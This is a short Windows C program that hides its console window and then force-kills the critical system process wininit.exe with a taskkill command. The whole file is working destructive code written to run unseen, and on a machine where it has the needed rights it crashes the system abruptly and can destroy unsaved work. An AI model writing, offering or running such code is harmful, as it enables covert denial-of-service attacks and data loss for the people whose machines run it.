#include <windows.h>

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    return system("taskkill /f /im wininit.exe");
}